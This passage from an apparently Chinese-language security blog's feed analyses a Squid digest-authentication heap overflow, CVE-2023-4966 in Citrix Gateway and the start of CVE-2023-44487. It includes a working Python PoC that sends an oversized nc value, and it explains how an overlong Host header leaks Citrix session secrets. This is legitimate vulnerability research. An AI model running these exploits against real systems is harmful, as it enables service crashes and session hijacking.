#25 0x000055a2e48b701c in Server::doClientRead (this=0x55a2e6118e78, io=...) at Server.cc:183
#26 0x000055a2e48b8250 in CommCbMemFunT&lt;Server, CommIoCbParams>::doDial (this=0x55a2e6117458) at ../../src/CommCalls.h:190
#27 0x000055a2e48b832b in JobDialer&lt;Server>::dial (this=0x55a2e6117458, call=...) at ../../src/base/AsyncJobCalls.h:175
#28 0x000055a2e48b8137 in AsyncCallT&lt;CommCbMemFunT&lt;Server, CommIoCbParams> >::fire (this=0x55a2e6117420)
at ../../src/base/AsyncCall.h:147
#29 0x000055a2e48d2d3c in AsyncCall::make (this=0x55a2e6117420) at AsyncCall.cc:44
#30 0x000055a2e48d3e50 in AsyncCallQueue::fire (this=0x55a2e5ca15d0) at AsyncCallQueue.cc:27
#31 0x000055a2e4669475 in EventLoop::dispatchCalls (this=0x7ffd91608f90) at EventLoop.cc:144
#32 0x000055a2e4669381 in EventLoop::runOnce (this=0x7ffd91608f90) at EventLoop.cc:121
#33 0x000055a2e46691d4 in EventLoop::run (this=0x7ffd91608f90) at EventLoop.cc:83
#34 0x000055a2e47a0842 in SquidMain (argc=0x3, argv=0x7ffd916091a8) at main.cc:1661
#35 0x000055a2e479fa03 in SquidMainSafe (argc=0x3, argv=0x7ffd916091a8) at main.cc:1353
#36 0x000055a2e479f9bd in main (argc=0x3, argv=0x7ffd916091a8) at main.cc:1341</code></pre><p>在gdb中可以看到value值为传入的请求的nc的值</p><pre tabindex="0"><code>gef➤ p value
$1 = {
static npos = 0xffffffffffffffff,
size_ = 0x28,
len_ = 0x8,
static SizeMax_ = 0xffff,
buf_ = 0x55a2e6125a60 "00000001"
}</code></pre><p>长度为nc的长度，此时只需要nc长度超过目标缓冲区<code>digest_request->nc</code>即可造成堆溢出。查看<code>digest_request</code>定义可知nc大小为9</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>class UserRequest : public Auth<span style="color:#f92672">::</span>UserRequest</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#a6e22e">MEMPROXY_CLASS</span>(Auth<span style="color:#f92672">::</span>Digest<span style="color:#f92672">::</span>UserRequest);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>public:</span></span><span style="display:flex;"><span><span style="color:#a6e22e">UserRequest</span>();</span></span><span style="display:flex;"><span><span style="color:#f92672">~</span><span style="color:#a6e22e">UserRequest</span>() override;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">authenticated</span>()<span style="color:#66d9ef">const</span> override;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">authenticate</span>(HttpRequest<span style="color:#f92672">*</span> request, ConnStateData<span style="color:#f92672">*</span> conn, Http<span style="color:#f92672">::</span>HdrType type) override;</span></span><span style="display:flex;"><span> Direction<span style="color:#a6e22e">module_direction</span>() override;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">addAuthenticationInfoHeader</span>(HttpReply<span style="color:#f92672">*</span> rep,<span style="color:#66d9ef">int</span> accel) override;</span></span><span style="display:flex;"><span><span style="color:#75715e">#if WAITING_FOR_TE</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> virtual<span style="color:#66d9ef">void</span><span style="color:#a6e22e">addAuthenticationInfoTrailer</span>(HttpReply<span style="color:#f92672">*</span> rep,<span style="color:#66d9ef">int</span> accel);</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">startHelperLookup</span>(HttpRequest<span style="color:#f92672">*</span>request, AccessLogEntry<span style="color:#f92672">::</span>Pointer<span style="color:#f92672">&amp;</span>al, AUTHCB<span style="color:#f92672">*</span>,<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>) override;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span><span style="color:#a6e22e">credentialsStr</span>() override;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>noncehex;<span style="color:#75715e">/* "dcd98b7102dd2f0e8b11d0f600bfb0c093" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>cnonce;<span style="color:#75715e">/* "0a4f113b" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>realm;<span style="color:#75715e">/* = "testrealm@host.com" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>pszPass;<span style="color:#75715e">/* = "Circle Of Life" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>algorithm;<span style="color:#75715e">/* = "md5" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> nc[<span style="color:#ae81ff">9</span>];<span style="color:#75715e">/* = "00000001" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>pszMethod;<span style="color:#75715e">/* = "GET" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>qop;<span style="color:#75715e">/* = "auth" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>uri;<span style="color:#75715e">/* = "/dir/index.html" */</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>response;</span></span></code></pre></div><p>digest_request为Auth::Digest::UserRequest指针，使用new分配内存，位于堆内</p><p><strong>PoC构造</strong></p><p>漏洞代码对应于处理[[../06 Protocol/HTTP digest身份认证|HTTP digest 认证]]，通过该认证请求需要发送两次请求，第一次不携带认证头，此时squid会返回407，需要提取响应中的nonce，简单的使用python即可构造
PoC</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> requests.auth<span style="color:#f92672">import</span> HTTPDigestAuth</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib</span></span><span style="display:flex;"><span>proxies<span style="color:#f92672">=</span>{</span></span><span style="display:flex;"><span><span style="color:#e6db74">'http'</span>:<span style="color:#e6db74">'http://192.168.59.197:3128'</span>,</span></span><span style="display:flex;"><span><span style="color:#e6db74">'https'</span>:<span style="color:#e6db74">'http://192.168.59.197:3128'</span></span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>resp_407<span style="color:#f92672">=</span><span style="color:#e6db74">"""</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Digest realm="localhost", nonce="47e5f5dc8b7237cf1153065afe358c89", qop="auth", stale=false"""</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>rr<span style="color:#f92672">=</span><span style="color:#e6db74">'''Digest username="test",realm="localhost",nonce="47e5f5dc8b7237cf1153065afe358c89",uri="/",cnonce="a0824a23a0394203c3023085915fd744",nc=00000001,response="b45560b922d64786ef7d6c96c9071dfa",qop="auth"'''</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span><span style="color:#e6db74">'''Digest username="</span><span style="color:#e6db74">{username}</span><span style="color:#e6db74">",realm="</span><span style="color:#e6db74">{realm}</span><span style="color:#e6db74">",nonce="</span><span style="color:#e6db74">{nonce}</span><span style="color:#e6db74">",uri="</span><span style="color:#e6db74">{uri}</span><span style="color:#e6db74">",cnonce="</span><span style="color:#e6db74">{cnonce}</span><span style="color:#e6db74">",nc=</span><span style="color:#e6db74">{nc}</span><span style="color:#e6db74">,response="</span><span style="color:#e6db74">{response}</span><span style="color:#e6db74">",qop="auth"'''</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>username<span style="color:#f92672">=</span><span style="color:#e6db74">"test"</span></span></span><span style="display:flex;"><span>password<span style="color:#f92672">=</span><span style="color:#e6db74">"123456"</span></span></span><span style="display:flex;"><span>realm<span style="color:#f92672">=</span><span style="color:#e6db74">"localhost"</span></span></span><span style="display:flex;"><span>nc<span style="color:#f92672">=</span><span style="color:#e6db74">"00000001"</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>cnonce<span style="color:#f92672">=</span><span style="color:#e6db74">''</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choice(string<span style="color:#f92672">.</span>ascii_lowercase<span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits)<span style="color:#66d9ef">for</span> _<span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>))</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>ha1<span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5((username<span style="color:#f92672">+</span><span style="color:#e6db74">':'</span><span style="color:#f92672">+</span> realm<span style="color:#f92672">+</span><span style="color:#e6db74">':'</span><span style="color:#f92672">+</span> password)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">'utf-8'</span>))<span style="color:#f92672">.</span>hexdigest()</span></span><span style="display:flex;"><span>ha2<span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">"GET:/"</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">"utf-8"</span>))<span style="color:#f92672">.</span>hexdigest()</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>resp<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span><span style="color:#e6db74">"http://116.62.202.230"</span>,proxies<span style="color:#f92672">=</span>proxies,verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> resp<span style="color:#f92672">.</span>status_code<span style="color:#f92672">==</span><span style="color:#ae81ff">407</span>:</span></span><span style="display:flex;"><span> resp_header<span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>headers</span></span><span style="display:flex;"><span> nonce<span style="color:#f92672">=</span> resp_header[<span style="color:#e6db74">"Proxy-Authenticate"</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">','</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">'='</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">'"'</span>)<span style="color:#f92672">.</span>lstrip(<span style="color:#e6db74">'"'</span>)</span></span><span style="display:flex;"><span>response<span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5((ha1<span style="color:#f92672">+</span><span style="color:#e6db74">":"</span><span style="color:#f92672">+</span>nonce<span style="color:#f92672">+</span><span style="color:#e6db74">":"</span><span style="color:#f92672">+</span>nc<span style="color:#f92672">+</span><span style="color:#e6db74">":"</span><span style="color:#f92672">+</span>cnonce<span style="color:#f92672">+</span><span style="color:#e6db74">":auth:"</span><span style="color:#f92672">+</span>ha2)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">'utf-8'</span>))<span style="color:#f92672">.</span>hexdigest()</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">"nonce:</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">cnonce:</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">response:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">"</span><span style="color:#f92672">.</span>format(nonce,cnonce,response))</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>rdata<span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>format(username<span style="color:#f92672">=</span>username,realm<span style="color:#f92672">=</span>realm,nonce<span style="color:#f92672">=</span>nonce,uri<span style="color:#f92672">=</span><span style="color:#e6db74">"/"</span>,cnonce<span style="color:#f92672">=</span>cnonce,nc<span style="color:#f92672">=</span>nc,response<span style="color:#f92672">=</span>response)</span></span><span style="display:flex;"><span>header<span style="color:#f92672">=</span> {</span></span><span style="display:flex;"><span><span style="color:#e6db74">"Proxy-Authorization"</span>: rdata</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>print(rdata)</span></span><span style="display:flex;"><span>resp<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span><span style="color:#e6db74">"http://116.62.202.230"</span>,proxies<span style="color:#f92672">=</span>proxies,verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,headers<span style="color:#f92672">=</span>header)</span></span><span style="display:flex;"><span>print(resp<span style="color:#f92672">.</span>status_code,resp<span style="color:#f92672">.</span>text)</span></span></code></pre></div><h3 id="小结">小结</h3><p>由于squid为多进程架构，在子进程因为漏洞退出时，父进程会重新生成子进程处理代理请求，实际利用比较鸡肋，也就不难理解该漏洞没有CVE编号了。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g" target="_blank">https://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g</a></p><p><a href="https://datatracker.ietf.org/doc/html/rfc7616" target="_blank">https://datatracker.ietf.org/doc/html/rfc7616</a></p></blockquote><p><strong>Created at 2023-10-26T10:41:55+08:00</strong></p></description></item><item><title>CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/</link><pubDate>Thu, 26 Oct 2023 10:18:12 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/</guid><description><h3 id="基本信息">基本信息</h3><p>Citrix中存在信息泄露漏洞，由于越界读取，未经授权的攻击者可以利用该漏洞获取到存储在内存的密钥。</p><p>该漏洞在八月下旬观察到在野利用。</p><p><strong>其他</strong></p><p>这个漏洞在10.19就已经分析完了，当时扫描了一下公网受影响服务器发现影响比较大，所以没有公开详情，在昨天国外安全研究员公开了PoC，所以现在才写分析文章。</p><h4 id="指纹">指纹</h4><p>hunter</p><pre tabindex="0"><code>web.title="Citrix Gateway"</code></pre><h3 id="影响版本">影响版本</h3><ul><li>NetScaler ADC and NetScaler Gateway 14.1 &lt; 14.1-8.50</li><li>NetScaler ADC and NetScaler Gateway 13.1 &lt; 13.1-49.15</li><li>NetScaler ADC and NetScaler Gateway 13.0 &lt; 13.0-92.19</li><li>NetScaler ADC 13.1-FIPS &lt; 13.1-37.164</li><li>NetScaler ADC 12.1-FIPS &lt; 12.1-55.300</li><li>NetScaler ADC 12.1-NDcPP &lt; 12.1-55.300</li></ul><h3 id="环境搭建">环境搭建</h3><p>参照<a href="/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/">CVE-2023-3519 Citrix Gateway RCE</a>搭建</p><ul><li><p>14.1-4.42
192.168.52.100</p></li><li><p>14.1-8.50
192.168.52.105</p></li><li><p>13.1-49.15
192.168.52.95</p></li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>初步分析</strong></p><p>根据<a href="https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967" target="_blank">官方通告</a>可知两个漏洞都是对内存的操作不当造成的。对应的CVSS3分别如下</p><ul><li>CVE-2023-4966
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L</li><li>CVE-2023-4967
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H</li></ul><p>综合可以知道如下信息：
利用漏洞无需权限、使用网络请求即可利用、均为内存型漏洞，应该跟[[CVE-2023-3519 Citrix Gateway RCE|CVE-2023-3519)类似，对用户输入没做校验，其中CVE-2023-4966 应该是实现了越界读取内存。<img alt="1" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/3.png"/></p><h4 id="函数diff">函数diff</h4><p>diff nsppe文件，分析各个函数修改的地方。</p><p><img alt="2" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/1.png"/></p><p>在逐个分析各个函数之后，目光转到<code>ns_aaa_oauth_send_openid_config</code>函数。</p><p>在补丁中<code>ns_aaa_oauth_send_openid_config</code>中对snprintf的返回值做了判断，在修复之前直接将snpritf的返回值放到了ns_vpn_send_response中，修复之后先判断返回值是否大于1FFFF。</p><p>snprintf将格式化的数据，写入内存中，原型为<code>int snprintf(char *str, int n, char * format [, argument, ...]);</code>，其中n为要写入的字符串的最大长度，snprintf最多会给内存写入n-1个字符，最后一个字符使用<code>'\0'</code>，当要格式化后的字符串大于n时，会在n-1处截断。但此时，snprintf会返回格式化字符串的长度，而不是写入内存的长度。</p><p><img alt="3" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/2.png"/><img alt="4" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/4.png"/></p><p>向上追溯调用栈，<code>ns_aaa_oauth_send_openid_config</code>被<code>ns_vpn_process_unauthenticated_request</code>调用，将<code>ns_vpn_process_unauthenticated_request</code> 代码给AI分析调用到该函数的路径，可知调用路径为<code>/oauth/idp/.well-known/openid-configuration</code><img alt="5" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/18.png"/></p><p>此处猜测未修复版本中会使用snprintf的返回值作为长度参数进行读取。
curl请求该接口，可以看到响应中中会把我们请求的host放进去</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ curl -i -s -k -X<span style="color:#e6db74">$'GET'</span> -H<span style="color:#e6db74">$'Host: curl.test.site'</span> -H<span style="color:#e6db74">$'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0'</span> -H<span style="color:#e6db74">$'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'</span> -H<span style="color:#e6db74">$'Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3'</span> -H<span style="color:#e6db74">$'Accept-Encoding: gzip, deflate'</span> -H<span style="color:#e6db74">$'Upgrade-Insecure-Requests: 1'</span> -H<span style="color:#e6db74">$'Sec-Fetch-Dest: document'</span> -H<span style="color:#e6db74">$'Sec-Fetch-Mode: navigate'</span> -H<span style="color:#e6db74">$'Sec-Fetch-Site: none'</span> -H<span style="color:#e6db74">$'Sec-Fetch-User: ?1'</span> -H<span style="color:#e6db74">$'Te: trailers'</span> -H<span style="color:#e6db74">$'Connection: close'</span> -b<span style="color:#e6db74">$'NSC_TASS=/menu/neo'</span><span style="color:#e6db74">$'https://192.168.52.234/oauth/idp/.well-known/openid-configuration'</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>HTTP/1.1<span style="color:#ae81ff">200</span> OK</span></span><span style="display:flex;"><span>X-Content-Type-Options: nosniff</span></span><span style="display:flex;"><span>X-XSS-Protection: 1; mode<span style="color:#f92672">=</span>block</span></span><span style="display:flex;"><span>Content-Length:<span style="color:#ae81ff">717</span></span></span><span style="display:flex;"><span>Cache-control: no-cache, no-store, must-revalidate</span></span><span style="display:flex;"><span>Pragma: no-cache</span></span><span style="display:flex;"><span>Content-Type: application/json; charset<span style="color:#f92672">=</span>utf-8</span></span><span style="display:flex;"><span>X-Citrix-Application: Receiver<span style="color:#66d9ef">for</span> Web</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">"issuer"</span>:<span style="color:#e6db74">"https://curl.test.site"</span>,<span style="color:#e6db74">"authorization_endpoint"</span>:<span style="color:#e6db74">"https://curl.test.site/oauth/idp/login"</span>,<span style="color:#e6db74">"token_endpoint"</span>:<span style="color:#e6db74">"https://curl.test.site/oaut</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">h/idp/token"</span>,<span style="color:#e6db74">"jwks_uri"</span>:<span style="color:#e6db74">"https://curl.test.site/oauth/idp/certs"</span>,<span style="color:#e6db74">"response_types_supported"</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">"code"</span>,<span style="color:#e6db74">"token"</span>,<span style="color:#e6db74">"id_token"</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">"id_token_signing_alg_va</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">lues_supported"</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">"RS256"</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">"end_session_endpoint"</span>:<span style="color:#e6db74">"https://curl.test.site/oauth/idp/logout"</span>,<span style="color:#e6db74">"frontchannel_logout_supported"</span>: true,<span style="color:#e6db74">"scopes_supported</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">"openid"</span>,<span style="color:#e6db74">"ctxs_cc"</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">"claims_supported"</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">"sub"</span>,<span style="color:#e6db74">"iss"</span>,<span style="color:#e6db74">"aud"</span>,<span style="color:#e6db74">"exp"</span>,<span style="color:#e6db74">"iat"</span>,<span style="color:#e6db74">"auth_time"</span>,<span style="color:#e6db74">"acr"</span>,<span style="color:#e6db74">"amr"</span>,<span style="color:#e6db74">"email"</span>,<span style="color:#e6db74">"given_name"</span>,<span style="color:#e6db74">"family_name"</span>,<span style="color:#e6db74">"nic</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kname"</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">"userinfo_endpoint"</span>:<span style="color:#e6db74">"https://curl.test.site/oauth/idp/userinfo"</span>,<span style="color:#e6db74">"subject_types_supported"</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">"public"</span><span style="color:#f92672">]}</span></span></span></code></pre></div><p>前面知道print_temp_rule大小为0x20000，返回值中共有6处重复了host，所以我们传入的host长度>21845(粗略估计)就可以触发溢出。再次请求，发现可以利用超长host读取到Citrix内存，实际测试发现host长度最多到24100左右。</p><p><img alt="6" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/15.png"/></p><p>借助这个漏洞，写了一个nuclei模板对公网扫描，对八百个独立IP扫描，截止至10.20，仍然有大约15%未修复，且通过这个漏洞可以读取到内存中的secret，后续可以借助这个secret绕过身份验证，请求后端接口。</p><p>这个接口也在oauth的配置中有提到<a href="https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp" target="_blank">https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp</a></p><p><img alt="7" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/20.png"/></p><p>ns_aaa_oauthrp_send_openid_config函数类似，也snprintf的返回值做了判断。<img alt="8" src="/images/vulnerability/CVE-2023-4966-citrix-gateway-info-disclosure.zh-cn.assets/5.png"/></p><p><strong>调试</strong></p><p>关闭看门狗对nsppe进程发送的信号，而后直接在对应位置处下断点即可。</p><pre tabindex="0"><code>root@citrix3# nspf help
Usage: '/netscaler/nspf ((&lt;process_name> | &lt;pid>) &lt;action> | query)'
where &lt;process_name> is one of:
NSPPE-00 aslearn awsconfig bgpd de
imi isisd metricscollectomonuploadd nsaaad
nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd
nscopo nsfsyncd nsgslbautosyncnslcd nslped
nsm nsnetsvc nsrised nstraceaggregatnsumond
ospf6d ospfd ptpd ripd ripngd
snmpd syshealthd
root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0
nspf NSPPE-00 pbmonitor 0
Removing pitboss monitor on process NSPPE-00 pid 37387</code></pre><p>PoC</p><pre tabindex="0"><code>https://github.com/Chestnuts4/POC/blob/master/nuclei_poc/CVE-2023-4966_citrix_info_disclose.yaml</code></pre><p><strong>实际利用</strong></p><p>通过漏洞可以读取到内存中的已登录会话的secret。</p><h3 id="小结">小结</h3><p>该漏洞整体分析、利用较为简单， 通过朴实无华的越界读取即可造成信息泄露，也无需进行内存布局。其实整体看nsppe，很多使用了snprintf的地方都对其返回值进行了判断，本次漏洞点没有对返回值做判断可能是因为开发时遗漏了。</p><p>另外即使修复该漏洞之后，已被劫持的会话仍然有效，需要使用如下命令清除已登录的会话</p><pre tabindex="0"><code>clar lb persistentSessions &lt;vServer></code></pre><p><strong>参考链接</strong></p><blockquote><p><a href="https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967" target="_blank">https://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967</a></p><p><a href="https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp" target="_blank">https://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp</a></p><p><a href="https://www.citrix.com/downloads/citrix-adc/" target="_blank">https://www.citrix.com/downloads/citrix-adc/</a></p></blockquote><p><strong>Created at 2023-10-26T10:18:12+08:00</strong></p></description></item><item><title>CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</link><pubDate>Fri, 13 Oct 2023 15:11:25 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/</guid><description><h3 id="基本信息">基本信息</h3><p>利用 HTTP/2 的多路复用流功能，恶意攻击者可通过快速创建请求并立即重置请求，绕过最大并发流限制，导致服务器资源的过度消耗。</p><h3 id="影响范围">影响范围</h3><p>Go &lt; 1.21.3
Go &lt; 1.20.10</p><hr><p>11.0.0-M1 &lt;= Apache Tomcat &lt;= 11.0.0-M11
10.1.0-M1 &lt;= Apache Tomcat &lt;= 10.1.13
9.0.0-M1 &lt;= Apache Tomcat &lt;= 9.0.80
8.5.0 &lt;= Apache Tomcat &lt;= 8.5.9</p><hr><p>grpc-go &lt; 1.58.3
grpc-go &lt; 1.57.1
grpc-go &lt; 1.56.3</p><hr><h3 id="环境搭建">环境搭建</h3><p>使用go起一个http2 server。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span><span style="color:#a6e22e">main</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (</span></span><span style="display:flex;"><span><span style="color:#e6db74">"fmt"</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">"net/http"</span></span></span><span style="display:flex;"><span>)</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span><span style="color:#a6e22e">main</span>() {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">HandleFunc</span>(<span style="color:#e6db74">"/"</span>,<span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">w</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ResponseWriter</span>,<span style="color:#a6e22e">r</span><span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Request</span>) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">Proto</span>,<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">URL</span>)</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Fprint</span>(<span style="color:#a6e22e">w</span>,<span style="color:#e6db74">"Hello World!"</span>)</span></span><span style="display:flex;"><span> })</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">ListenAndServeTLS</span>(<span style="color:#e6db74">":443"</span>,<span style="color:#e6db74">"certs/cert.pem"</span>,<span style="color:#e6db74">"certs/key.pem"</span>,<span style="color:#66d9ef">nil</span>)</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>使用curl测试是否成功<code>curl https://localhost -i -k --http2 -vvv</code>。也可以使用nginx搭建一个http2服务器，配置很多博客都有就不写了。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">➜ http curl https://localhost -i -k --http2 -vvv</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* Trying 127.0.0.1:443...</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* Connected to localhost (127.0.0.1) port 443 (#0)</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* ALPN: offers h2,http/1.1</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">* 